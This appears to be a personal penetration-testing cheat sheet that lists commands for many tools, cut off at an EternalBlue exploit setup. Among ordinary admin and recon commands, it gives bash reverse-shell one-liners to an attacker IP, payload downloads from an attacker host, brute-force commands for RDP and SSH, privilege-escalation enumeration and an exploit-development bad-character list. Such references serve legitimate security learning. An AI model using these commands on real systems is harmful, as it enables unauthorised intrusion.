---
title: "Security grimoire"
layout: default
author_profile: true
classes: wide
---

# Security Grimoire

Welcome to [@muemmelmoehre](https://github.com/muemmelmoehre){:target="blank"}'s online grimoire / cheat-sheet for useful commands. Enjoy!


*(Awesome ASCII art like the one below can be found [here](https://asciiart.website/index.php){:target="blank"}.)*




```
                        .-~~~~~~~~~-._       _.-~~~~~~~~~-.
                    __.'              ~.   .~              `.__
                  .'//                  \./                  \\`.
                .'//                     |                     \\`.
              .'// .-~"""""""~~~~-._     |     _,-~~~~"""""""~-. \\`.     
            .'//.-"                 `-.  |  .-'                 "-.\\`.
          .'//______.============-..   \ | /   ..-============.______\\`.
        .'______________________________\|/______________________________`.

```



## ACCESSCHK
```
# check for vulnerable services
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```



## ADB
```bash
# list devices
adb devices
adb devices -l

# launch shell on emulator
adb shell

# launch shell in specific app context
adb shell
run-as package_name_here

# show installed packages
adb shell pm list packages
pm list packages

# return path to app's files
adb shell pm path package_name_here
pm path package_name_here

# start activity and perform action
adb shell am start -a action_name_here -n package_name_here/activity_name_here
am start -a action_name_here -n package_name_here/activity_name_here

# start activity and perform action with data
adb shell am start -a action_name_here -n package_name_here/activity_name_here -d URI_to_data_here
am start -a action_name_here -n package_name_here/activity_name_here -d URI_to_data_here

# start service
adb shell am startservice -n package_name_here/service_name_here -e "extra_key_here" "extra_value_here"
am startservice -n package_name_here/service_name_here -e "extra_key_here" "extra_value_here"

# send broadcast
adb shell am broadcast -a action_name_here -e "extra_key_here" "extra_value_here"
am broadcast -a action_name_here -e "extra_key_here" "extra_value_here"

# send keystroke to device
input text_here / key_event_here

# copy file from local machine to device
adb pull /path/to/file/on/device /path/to/file/on/pc

# copy file from device to local machine
adb push /path/to/file/on/pc /path/to/file/on/device

# install apk on device
adb install /path/tp/apk

# uninstall app
adb uninstall app_name_here

# exit persistent shell
exit

# print help
adb help

# explicitely choose device
adb -s emulator_serial_number_here command_here

# print device log
adb shell logcat
logcat

# print log help
logcat --help

# query database content
adb shell content query --uri content://uri_here
content query --uri content://uri_here

# query database for specific entry
adb shell content query --uri content://uri_here --where "some_column_name='some_value_here'"
content query --uri content://uri_here --where "some_column_name='some_value_here'"

# query database for all values in column_name_here
adb shell content query --uri content://uri_here --projection column_name_here
content query --uri content://uri_here --projection column_name_here

# insert new entry in database; type : e.g. s = string, i = int
adb shell content insert --uri content://uri_here --bind column_name_here:type_here:value_here --bind another_column_name_here:type_here:value_here
content insert --uri content://uri_here --bind column_name_here:type_here:value_here --bind another_column_name_here:type_here:value_here

# update database entry
adb shell content update --uri content://uri_here --bind column_name_here:type_here:value_here --where "some_column_name='some_value_here'"
content update --uri content://uri_here --bind column_name_here:type_here:value_here --where "some_column_name='some_value_here'"
```



## AMASS
```bash
# subdomain enumeration
/path/to/amass enum -d domain_here > outfile_here

# subdomain enumeration with API keys in config_file
/path/to/amass enum -d domain_here -config /path/to/config_file_here > outfile_here

# discover targets via ASN
/path/to/amass intel -asn ASN_here
```



## APACHE2
```bash
# start service
sudo systemcctl start apache2

# stop service
sudo systemctl stop apache2

# start service at boot time
sudo systemctl enable apache2

# disable service start at boot time
sudo systemctl disable apache2

# check for running service
sudo ss -plant | grep apache2

# read out first line of file via error message
sudo apache2 -f /path/to/file/here
```



## APKTOOL
```bash
# decode apk
apktool d /path/to/apk

# build app from smali
apktool b /path/to/appfolder
```



## APT
```bash
# search for package in cached database
apt-cache search package_here

# search for package
apt search package_here

# show package description
apt show package_here

# purge package
apt remove --purge package_here
```



## AWK
```bash
# specify field delimiter + output text
awk -F "delimiter_here" '{print $no_element_here}'

# extract 1st + 3rd element, fields delimited by "::"
echo "some::stuff::here" | awk -F "::" '{print $1, $3}'
```



## AXEL
```bash
# download file from FTP / HTTP(S) with X simultaneous connections
axel -a -n X -o /path/to/outfile url_here
```



## BAD CHARS
```python
# plain
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

# bash
badchars=(
  \\x01 \\x02 \\x03 \\x04 \\x05 \\x06 \\x07 \\x08 \\x09 \\x0a \\x0b \\x0c \\x0d \\x0e \\x0f \\x10
  \\x11 \\x12 \\x13 \\x14 \\x15 \\x16 \\x17 \\x18 \\x19 \\x1a \\x1b \\x1c \\x1d \\x1e \\x1f \\x20
  \\x21 \\x22 \\x23 \\x24 \\x25 \\x26 \\x27 \\x28 \\x29 \\x2a \\x2b \\x2c \\x2d \\x2e \\x2f \\x30
  \\x31 \\x32 \\x33 \\x34 \\x35 \\x36 \\x37 \\x38 \\x39 \\x3a \\x3b \\x3c \\x3d \\x3e \\x3f \\x40
  \\x41 \\x42 \\x43 \\x44 \\x45 \\x46 \\x47 \\x48 \\x49 \\x4a \\x4b \\x4c \\x4d \\x4e \\x4f \\x50
  \\x51 \\x52 \\x53 \\x54 \\x55 \\x56 \\x57 \\x58 \\x59 \\x5a \\x5b \\x5c \\x5d \\x5e \\x5f \\x60
  \\x61 \\x62 \\x63 \\x64 \\x65 \\x66 \\x67 \\x68 \\x69 \\x6a \\x6b \\x6c \\x6d \\x6e \\x6f \\x70
  \\x71 \\x72 \\x73 \\x74 \\x75 \\x76 \\x77 \\x78 \\x79 \\x7a \\x7b \\x7c \\x7d \\x7e \\x7f \\x80
  \\x81 \\x82 \\x83 \\x84 \\x85 \\x86 \\x87 \\x88 \\x89 \\x8a \\x8b \\x8c \\x8d \\x8e \\x8f \\x90
  \\x91 \\x92 \\x93 \\x94 \\x95 \\x96 \\x97 \\x98 \\x99 \\x9a \\x9b \\x9c \\x9d \\x9e \\x9f \\xa0
  \\xa1 \\xa2 \\xa3 \\xa4 \\xa5 \\xa6 \\xa7 \\xa8 \\xa9 \\xaa \\xab \\xac \\xad \\xae \\xaf \\xb0
  \\xb1 \\xb2 \\xb3 \\xb4 \\xb5 \\xb6 \\xb7 \\xb8 \\xb9 \\xba \\xbb \\xbc \\xbd \\xbe \\xbf \\xc0
  \\xc1 \\xc2 \\xc3 \\xc4 \\xc5 \\xc6 \\xc7 \\xc8 \\xc9 \\xca \\xcb \\xcc \\xcd \\xce \\xcf \\xd0
  \\xd1 \\xd2 \\xd3 \\xd4 \\xd5 \\xd6 \\xd7 \\xd8 \\xd9 \\xda \\xdb \\xdc \\xdd \\xde \\xdf \\xe0
  \\xe1 \\xe2 \\xe3 \\xe4 \\xe5 \\xe6 \\xe7 \\xe8 \\xe9 \\xea \\xeb \\xec \\xed \\xee \\xef \\xf0
  \\xf1 \\xf2 \\xf3 \\xf4 \\xf5 \\xf6 \\xf7 \\xf8 \\xf9 \\xfa \\xfb \\xfc \\xfd \\xfe \\xff
)

# C
char badchars[] =
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";

# PHP
$badchars =
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" +
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" +
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" +
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" +
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" +
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" +
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" +
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" +
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" +
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" +
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" +
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" +
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" +
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" +
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" +
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";

# PY2
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

# PY3
badchars = b"\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

```



## BASH / SH
```bash
# add ! at the end of each line in wordlist
for i in $(cat wordlist.txt); do echo $i; echo ${i}\!; done > tmp
mv tmp wordlist.txt

# for loop from x to z, incrementing in steps of y
for i in $(seq x y z); do command_here; done

# do something for each line in file
for line in $(cat file_here); do command_here arg_here_with_$line; done

# while loop
while [ condition ]; do command_here; other_command_here; done

# conditional statements
if [ some_condition ]; then
  command_here
elif[ some_other_condition ]; then
  other_command_here
else
  some_other_command_here
fi

# function (no need to specify args!)
function function_name_here {
  some_command_here
}

function_name_here() {
  some_command_here
}

# function call
function_name_here

# function call with args
function_name_here some_arg_here

# evaluate some_other_command before some_command and include the result
some_command `some_other_command with_args`
some_command $(some_other_command with_args)

# chain commands - only execute second if first successful
first_command && second_command 

# chain commands - pipe output of first into second
first_command | second_command 

# show variable's value
echo $VARIABLE_HERE

# increment value
((value++))

# decrement value
((value--))

# data streams
## send from
<
## write to
>
## append to
>>

# send STDERR (2) to log file
some_command_here 2> error.log

# run bash with debug output
#!/bin/bash -x

# capture user input + display
read variable_name_here
echo $variable_name_here

# capture user input with prompt
read -p 'prompt_here: ' variable_name_here

# silently capture user input
read -sp 'prompt_here: ' variable_name_here

# conditions
## not
!
## and
&&
## or
||
## equal
=
-eq
## not equal
!=
-ne
## greater than
-gt
## greater than or equal
-ge
## less than
-lt
## less than or equal
-le
## file exists
-e file_name_here
## directory exists
-d file_name_here
## file exists + not empty
-s file_name_here
## file exists with read permission
-r file_name_here
## file exists with write permission
-w file_name_here
## file exists with execute permission
-x file_name_here
## test for empty string
### empty
-z string_here
### length > 0
-n string_here

# exit status (0 = succes, else failure)
return some_value_here

# reverse shell
bash -i >& /dev/tcp/attacker_IP/port_here 0>&1
0<&1;exec 1<>/dev/tcp/attacker_IP/port_here; bash <&1 >&1 2>&1

# fix TTY
## background reverse shell
Ctrl-Z
## find tty values on attacker's box
echo $TERM
stty -a
## fix TTY + foreground reverse shell again
stty raw -echo && fg
## back in reverse shell
reset
export SHELL=bash
export TERM=term_value_here
stty rows no_rows_here columns no_columns_here

# stabilize shell
/usr/bin/script -qc /bin/bash /dev/null
/bin/sh -i
/bin/bash -i

# scan
host=target_IP_here; echo "--- scan starting ---"; for port in {1..65535}; do timeout .1 bash -c "echo >/dev/tcp/$host/$port" && echo "port $port is open"; done; echo "--- scan finished ---"
```



## BASH UTILITIES & CO.
```bash
# add new user
sudo adduser user_name_here

# deleter user + their files
sudo userdel -r user_name_here

# create alias in .bash_profile
alias alias_name_here="command_to_run_here"
source ~/.bash_profile

# list defined aliases
alias

# delete alias
unalias alias_here

# display arp entries
arp -a

# background process / job
Ctrl+Z + bg
some_command_here &

# base64 encode + disable line wrapping / print everything on the same line
base64 -w 0 file_here
some_command_here | base64 -w 0

# base64 encode string
echo -n string_here | base64
cat file_name_here | base64

# base64 decode string
echo -n b64_string_here | base64 -d
echo -n b64_string_here | base64 -d >> file_name_here

# pack command for transport
echo 'command && -stuff here' | base64

# unpack command to file on target
echo 'base64_here' > /tmp/my_script.sh
echo '2nd_base64_here' >> /tmp/my_script.sh

# read all files in . + grep for search_term
cat *|grep search_term

# read all files in . + grep for search_term (case-insensitive)
cat *|grep -i search_term

# read all files in . + grep out search_term
cat *|grep -v search_term

# read all files in . + grep for lines starting with search_term
cat *|grep ^search_term

# read all files in . + grep for lines ending with search_term
cat *|grep search_term$

# show real, effective, saved, file system UID / GID
cat /proc/$$/status | grep "[UG]id"

# change permissions for folder + subfolders
chmod value_here -R /path/to/folder

# change default shell (effective after login)
chsh -s /path/to/shell
chsh -s /path/to/shell username_here

# compare files : 1-unique to 1st file, 2-unique to 2nd file 3-both
comm file1_here file2_here

# compare and only show lines unique to 2nd file
comm -13 file1_here file2_here

# show cron jobs
crontab -l
ls -la /etc/ | grep cron
ls -lah /var/spool/cron
ls -la /etc/cron*
cat /etc/cron*
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

# compare files : --unique to 1st file, +-unique to 2nd file
diff -c file1_here file2_here
diff -u file1_here file2_here

# output previous return value
echo $?

# show PID of current shell
echo $$

# foreground process / job
fg
fg %job_no_here
fg %command_name_here
fg %PID_here

# foreground previous job
fg %-

# foreground current job
fg %+
fg %%

# list every file with SUID bit set
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -4000 -type f 2>/dev/null
find / -perm -u+s -type f 2>/dev/null

# find files with SUID / SGID bit set
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# find files not owned by root
find \! -uid 0

# find all readable files in /folder_here
find /folder_here -maxdepth 1 -readable -type f

# find all writable files in /folder_here
find /folder_here -maxdepth 1 -writable -type f

# find all writable directories
find / -executable -writable -type d 2> /dev/null

# list files recursively
find . -type f

# print path to file
find . -name file_name_here

# find config files
find . | grep config

# show bash history
history

# show routing table
ip r

# list running jobs
jobs

# use command from history
!line_no_here

# repeat last command
!!

# kill process
kill PID_here

# show program's shared object dependencies
ldd /full/path/to/program/here

# link binary (use without full path)
sudo ln -s /path/to/binary /usr/bin/binary_name_here

# search file in locate.db
locate file_here

# update locate.db
sudo updatedb

# display files on single line
ls -a1

# display files in chronological order
ls -lt

# display loaded modules
lsmod

# man keyword search
man -k keyword_here
man -k 'regex_here'
apropos keyword_here

# read specific section of man page
man section_no_here man_page_here

# calculate MD5 sum of string
echo -n "my awesome string here" | md5sum

# calculate MD5 sum of file
md5sum file_name_here

# create directory + all required parent directories
mkdir -p parent_here/folder_name_here

# create directories + all required parent directories
mkdir -p parent_here/{folder1,folder2,folder3}

# generate Linux user password
mkpasswd -m sha-512 new_password_here

# enumerate shares
nmblookup -A IP_here

# import client certificate
## extract .pem
openssl pkc12 -in certificate_name_here.pfx -nocerts -out certificate_name_here.pem -nodes
## extract .crt
openssl pkcs12 -in certificate_name_here.pfx -nokeys -out certificate_name_here.crt -nodes
## copy to /usr/local/share/ca-certificates/
sudo cp certificate_name_here.crt /usr/local/share/ca-certificates/certificate_name_here.crt
## update
sudo update-ca-certificates

# check for GUI
pidof X

# list running processes
ps
ps -ef

# list specific process
ps -fC process_name_here

# terminal logging
script /path/to/log
exit

# sort text file in alphabetical order + remove duplicates
sort -u file_name_here

# reload .bashrc / .bash_profile
source ~/.bashrc
source ~/.bash_profile

# run shell (user's shell in /etc/passwd) as login shell
sudo -i
sudo --login

# list sudo-allowed programs
sudo -l
sudo --list

# run shell (SHELL env variable or user's shell in /etc/passwd)
sudo -s
sudo --shell

# run program as another user
sudo -u other_user_here program_here
sudo --user other_user_here program_here

# continously show last lines from text file
tail -f /path/to/file

# output last X lines from file
tail -nX /path/to/file

# print last line, second to last, etc. line
tail -1
tail -2

# untar .tar.gz
tar -xvzf tarball_here

# untar .tar.gz to specific location
tar -C /path/to/destination -xvzf tarball_here

# unzip .tar.bz2
tar -xf tarball_here

# display kernel version
uname -a
uname -mrs
cat /proc/version

# display OS / distro version
cat /etc/issue
cat /etc/*-release
cat /etc/os-release
cat /usr/lib/os-release
cat /etc/system-release
cat /etc/redhat-release
cat /etc/centos-release
lsb_release -d
rpm -q centos-release
dmesg | grep Linux
ls /boot | grep vmlinuz-

# show number of occurrences
uniq -c

# update locate's file name database
updatedb

# list logged-in users
w

# run command every X seconds (default : 2)
watch -n X command_here

# number of words in text file
wc -w file_name_here

# number of lines in text file
wc -l file_name_here

# number of charcters in text file
wc -m file_name_here

# number of bytes in text file
wc -c file_name_here

# locate program
whereis program_name_here

# find file in $PATH directories
which file_name_here
```



## BATCH
```batch
# launch binary
START binary_name_here.exe
```



## BUSYBOX
```bash
# HTTP server
busybox httpd -f -p port_here
```



## CADAVER
```bash
# open connection to webdaf endpoint
cadaver
open url_here/path/to/webdav
```



## CERTUTIL
```powershell
# download file
certutil -urlcache -split -f url_to_web_file /path/to/out/file
```



## CEWL
```bash
# create a wordlist from URL
cewl -w /path/to/outfile.txt -v url_here

# create wordlist with minimum word length
cewl -w /path/to/outfile.txt -m min_length_here url_here
```



## CHECKSEC
```bash
# check flags on binary
checksec file_name_here
```



## CMD
```powershell
# display arp entries
arp -a

# clear screen
cls

# list stored credentials
cmdkey /list

# execute commands
cmd.exe /c command_here

# enumerate hidden files
dir -ah
dir /ah
attrib

# show alternate data streams
dir /a /r

# show path variable
path
echo %PATH%

# run local executable
.\some_executable_here

# show environment variable
echo %variable_name_here%

# show other variables
set

# set other variables
set variable_name=value_here

# chain commands - execute both
first_command & second_command 

# chain commands - only execute second if first successful
first_command && second_command 

# chain commands - pipe output of first into second
first_command | second_command 

# chain commands - if first fails, execute second
first_command || second_command 

# conditional statements
if %some_variable%==some_value (command_here) else (some_other_command_here)

# list files in directory
for %i in (*.*) do @echo FILE: %i

# display output without command prompt
@command_here

# enumerate shares
nbtstat -A IP_here

# find connections for specific service
netstat -anbo

# show open connections
netstat -ano

# find listening ports
netstat -an | findstr "LISTENING"

# find a domain controller (on box)
nltest /dsgetdc:domain_name_here

# find applied patches
type C:\Windows\WindowsUpdate.log | findstr KB

# display routing tables
route print

# show firewall status
netsh firewall show state

# show firewall config
netsh firewall show config

# list scheduled tasks
schtasks /query /fo LIST /v

# get details for app_name_here
schtasks /query /TN "\path\to\app_name_here" /v /fo LIST

# print info
set

# print systeminfo
systeminfo

# kill process
taskkill /im:process_name_here

# force kill process
taskkill /im:process_name_here /f

# list processes
tasklist

# show services
tasklist /svc
net start
wmic service list brief
wmic service list

# display processus running as SYSTEM
tasklist /v /fi "username eq SYSTEM"

# display user information
whoami /all

# display user privileges
whoami /priv

# find domain name (on box)
wmic computersystem get domain

# run as other user
C:\Windows\System32\runas.exe /env /noprofile /user:user_name_here password_here "command_or_program_here"
```



## COMPGEN
```bash
# show help
help compgen

# list all aliases
compgen -a

# list all shell built-ins
compgen -b

# list all commands
compgen -c

# list current directory name
compgen -d

# list names of exported shell variables
compgen -e

# list files in current directory
compgen -f

# list groups
compgen -g

# list jobs
compgen -j

# list reserved words
compgen -k

# list services
compgen -s

# list user aliases
compgen -u

# list shell variables
compgen -v
```



## CRACKMAPEXEC
```bash
# check for password policy on Windows domain
crackmapexec protocol_here IP_here --pass-pol -u '' -p ''

# brute force login
crackmapexec protocol_here IP_here -u userlist.txt -p passwordlist.txt

# crawl smb shares
crackmapexec smb IP_here -u user -p password -M spider_plus
```



## CROWBAR
```bash
# brute force RDP login (ideally 1 thread for RDP)
crowbar -b rdp -s target_IP_or_subnet_here -u user_name_here -C /path/to/wordlist -n number_of_threads_here

# brute force ssh keys for user
crowbar -b sshkey -s target_IP_here -u user_name_here -k /path/to/key/folder/
```



## CRUNCH
```bash
# pattern
# a-z
@
# A-Z
,
# 0-9
%
# special chars (incl. space)
^

# generate wordlist
crunch min_length_here max_length_here -t pattern_here -o /path/to/outfile

# generate wordlist with limited character set (predefined charsets in /usr/share/crunch/charset.lst)
crunch min_length_here max_length_here allowed_chars_here -t pattern_here -o /path/to/outfile
crunch min_length_here max_length_here -f /usr/share/crunch/charset.lst charset_name_here -o /path/to/outfile
```



## CSCRIPT
```powershell
# run .vbs script
cscript /path/to/vbs_script args_here

# download file
cscript wget.vbs http://attacker_IP/path/to/file outfile_here
```



## CURL
```bash
# basic syntax
curl "protocol_here://url_here"

# send GET request
curl -X GET "https://url_here" -H "header_here: value_here" -H "another_header_here: value_here" -H "header_without_value;"

# send POST request
curl -X POST "https://url_here" -H "header_here: value_here" -d "{\"some_data\":\"value_here\",\"some_more_data\":\"value_here\"}"

# PUT file
curl -T /path/to/local/file https://url_here/path/to/remote/file

# PUT json data
curl -X PUT -H "Content-Type: application/json" -d '{"key":"value","key":"value"}' https://url_here

# retrieve file from IMAP/S, POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET, TFTP
curl -O /path/to/outfile url_here
```



## CUT
```bash
# extract 2nd field, fields delimited by ","
echo "some enumeration of stuff, more stuff, even more stuff" | cut -f 2 -d ","

# specify field, delimiter (only single char!)
cut -f no_here -d "delimiter_here" /path/to/file
```



## DAVTEST
```bash
# check permissions on exposed WebDAV endpoint
davtest -url http://endpoint_URL_here
```



## DEX2JAR
```bash
# convert apk to jar
d2j-dex2jar /path/to/apk -o outfile.jar
```



## DIG
```bash
# print public IP
dig +short myip.opendns.com @resolver1.opendns.com
```



## DIRB
```bash
# dirbust domain
dirb url_here

# set cookie
dirb -c cookie_here url_here

# set header
dirb -H header_here url_here

# don't show specific response code
dirb -N response_code_here url_here

# no recursion
dirb -r url_here

# interactive recursion
dirb -R url_here

# authenticated scan
dirb -u user_name_here:password_here url_here

# delay between request
dirb url_here -z delay_in_milliseconds_here url_here
```



## DNSENUM
```bash
# grab info (subdomains, zone transfer, reverse lookup etc.)
dnsenum domain_here
```



## DNSRECON
```bash
# find hostname
dnsrecon -d domain_here -r range_here

# attempt zone transfer
dnsrecon -d domain_here -t axfr

# brute force subdomains
dnsrecord -d domain_here -D /path/to/wordlist -t brt
```



## DOCKER
```bash
# show available containers
docker ps

# run shell in container
docker exec -it container_ID_here /bin/bash
```



## DOS2UNIX / UNIX2DOS
```bash
# convert text files from DOS to Unix (CR/LF -> LF)
dos2unix filename
dos2unix filename -n new_file

# convert text files from Unix to DOS (LF -> CR/LF)
unix2dos filename
unix2dos filename -n new_file
```



## DPKG
```bash
# install local package
dpkg -i /path/to/.deb
```



## DRUPAL
```bash
# droopescan
droopescan scan drupal -u IP_here
```



## ENV
```bash
# show all environment variables
env

# set environment variable 
export VARIABLE_HERE=value_here

# show environment variable's value
echo $VARIABLE_HERE
```



## ETERNALBLUE
```bash
# setup virtualenv for PY2
virtualenv --python=python2 venv
source venv/bin/activate

# install impacket
pip2.7 install impacket

# get exploit
git clone https://github.com/worawit/MS17-010.git

